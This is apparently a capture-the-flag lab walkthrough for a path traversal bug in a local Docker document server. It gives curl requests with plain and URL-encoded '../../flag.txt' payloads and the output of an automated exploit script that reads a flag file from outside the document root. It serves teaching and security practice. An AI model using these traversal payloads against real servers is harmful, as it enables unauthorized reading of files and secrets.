# Walkthrough: Path Traversal

## Setup

```bash
docker compose up --build -d
curl http://localhost:8082/
```

Output:
```json
{
  "service": "Document Server v1.0",
  "docs": ["readme.txt", "policy.txt", "report.txt"],
  "endpoint": "GET /file?name=<filename>"
}
```

## Step 1: Confirm the Endpoint Works

```bash
curl "http://localhost:8082/file?name=readme.txt"
```

Output:
```
Welcome to the document server.
```

## Step 2: Traverse to /flag.txt

The document root is `/app/docs`. Two `..` sequences reach the filesystem root. The flag lives at `/flag.txt`:

```bash
curl "http://localhost:8082/file?name=../../flag.txt"
```

Output:
```
POC{...}
```

## URL-Encoded Variant

```bash
curl "http://localhost:8082/file?name=%2e%2e%2f%2e%2e%2fflag.txt"
```

Same result. The server URL-decodes the parameter before the path join.

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8082
```

Output:
```
[*] Target: http://localhost:8082
[*] Document root files: ['readme.txt', 'policy.txt', 'report.txt']
[*] readme.txt: Welcome to the document server.

[*] Traversal payload: ../../flag.txt
[*] Requesting: http://localhost:8082/file?name=../../flag.txt

[*] Response:
POC{...}

[+] Flag: POC{...}
```
